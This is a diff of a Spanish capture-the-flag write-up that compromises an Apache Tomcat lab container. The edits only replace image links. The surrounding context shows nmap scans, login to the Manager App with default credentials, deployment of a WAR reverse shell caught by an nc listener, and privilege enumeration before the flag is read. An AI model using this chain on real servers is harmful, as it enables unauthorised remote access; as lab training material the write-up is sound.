@@ -35,7 +35,7 @@ nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 172.17.0.2
 
 Resultado:
 
-![](images/IMG-20260710182517938.png)
+![[{{noteName}}-image-14.png]]
 
 Único puerto abierto: 8080/tcp.
 
@@ -45,7 +45,7 @@ Resultado:
 nmap -p 8080 -sC -sV -oN allports 172.17.0.2
 ```
 
-![](images/IMG-20260710182550430.png)
+![[{{noteName}}-image-15.png]]
 
 Se confirma Apache Tomcat 9.0.65 sirviendo la página por defecto.
 
@@ -55,7 +55,7 @@ Se confirma Apache Tomcat 9.0.65 sirviendo la página por defecto.
 http://172.17.0.2:8080/
 ```
 
-![](images/IMG-20260710182632109.png)
+![[{{noteName}}-image-16.png]]
 
 Desde la página de inicio por defecto de Tomcat se accede al enlace **Manager App**, protegido con autenticación básica HTTP.
 
@@ -67,7 +67,7 @@ Se prueban combinaciones de credenciales comunes asociadas al Manager App de Tom
 tomcat:s3cr3t
 ```
 
-![](images/IMG-20260710182843611.png)
+![[{{noteName}}-image-17.png]]
 ### 5. Generación del payload WAR
 
 ```bash
@@ -86,9 +86,10 @@ nc -lvnp 1234
 
 Se sube y despliega el archivo `revshell.war` desde el propio panel Manager App (sección de despliegue de WAR). Tras acceder a la ruta de la aplicación desplegada (`/revshell/`), se dispara la reverse shell y se recibe la conexión en el listener.
 
-![[{{noteName}}-image-8.png]]
+![[{{noteName}}-image-18.png]]
 
-![[{{noteName}}-image-7.png]]
+![[{{noteName}}-image-19.png]]
+
 
 ### 7. Estabilización de la shell
 
@@ -109,7 +110,7 @@ stty rows 33 columns 144
 tomcat@tomcat:~$ whoami
 ```
 
-![[{{noteName}}-image-1.png]]
+![[{{noteName}}-image-20.png]]
 
 Shell estable como usuario `tomcat`.
 
@@ -119,7 +120,7 @@ Shell estable como usuario `tomcat`.
 grep bash /etc/passwd
 ```
 
-![[{{noteName}}-image-2.png]]
+![[{{noteName}}-image-21.png]]
 
 ### 9. Verificación de privilegios sudo
 
@@ -127,7 +128,7 @@ grep bash /etc/passwd
 sudo -l
 ```
 
-![[{{noteName}}-image-3.png]]
+![[{{noteName}}-image-22.png]]
 
 `sudo` no está disponible en el sistema.
 
@@ -137,7 +138,7 @@ sudo -l
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-![[{{noteName}}-image-4.png]]
+![[{{noteName}}-image-23.png]]
 
 Ningún binario SUID explotable presente; todos corresponden a utilidades estándar del sistema sin vector de escalada directo.
 
@@ -147,7 +148,7 @@ Ningún binario SUID explotable presente; todos corresponden a utilidades están
 find / -name "flag.txt" -o -name "flag" -o -name "*.flag" 2>/dev/null
 ```
 
-![[{{noteName}}-image-5.png]]
+![[{{noteName}}-image-24.png]]
 
 La flag se encuentra directamente accesible dentro del directorio de trabajo del propio usuario `tomcat` (`/opt/tomcat`), sin necesidad de escalar privilegios.
 
@@ -157,7 +158,7 @@ La flag se encuentra directamente accesible dentro del directorio de trabajo del
 cat /opt/tomcat/flag.txt
 ```
 
-![[{{noteName}}-image-6.png]]
+![[{{noteName}}-image-25.png]]
 
 ## Lecciones Aprendidas
 
